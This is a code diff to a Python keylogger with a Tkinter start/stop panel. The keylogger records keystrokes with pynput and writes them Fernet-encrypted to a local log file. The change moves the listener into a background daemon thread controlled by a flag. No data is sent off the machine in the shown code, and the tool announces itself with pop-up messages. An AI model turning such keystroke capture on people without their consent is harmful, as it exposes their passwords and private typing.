@@ -1,4 +1,5 @@
 import os
+import threading
 from pynput.keyboard import Key, Listener
 from cryptography.fernet import Fernet
 import tkinter as tk
@@ -23,6 +24,10 @@ cipher = Fernet(key)
 # File to save encrypted logs
 log_file = "encrypted_key_log.txt"
 
+# Flag to control the listener thread
+keylogger_running = False
+listener_thread = None
+
 # ==========================
 # Keylogger Functions
 # ==========================
@@ -46,24 +51,36 @@ def on_press(key):
 
 def on_release(key):
     """Handle key release events."""
-    if key == Key.esc:
-        # Stop listener when ESC is pressed
+    global keylogger_running
+    if key == Key.esc or not keylogger_running:
+        # Stop listener if ESC is pressed or keylogger_running is False
         return False
+
+def run_keylogger():
+    """Runs the keylogger listener."""
+    global keylogger_running
+    keylogger_running = True
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
 
 # ==========================
 # GUI for Control
 # ==========================
 
 def start_keylogger():
-    """Starts the keylogger."""
-    messagebox.showinfo("Keylogger", "Keylogger started! Press 'ESC' to stop.")
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
+    """Starts the keylogger in a new thread."""
+    global listener_thread, keylogger_running
+    if not keylogger_running:
+        keylogger_running = True
+        listener_thread = threading.Thread(target=run_keylogger, daemon=True)
+        listener_thread.start()
+        messagebox.showinfo("Keylogger", "Keylogger started! Press 'ESC' to stop.")
 
 def stop_keylogger():
     """Stops the keylogger."""
+    global keylogger_running
+    keylogger_running = False
     messagebox.showinfo("Keylogger", "Keylogger stopped!")
-    root.destroy()
 
 # ==========================
 # GUI Setup
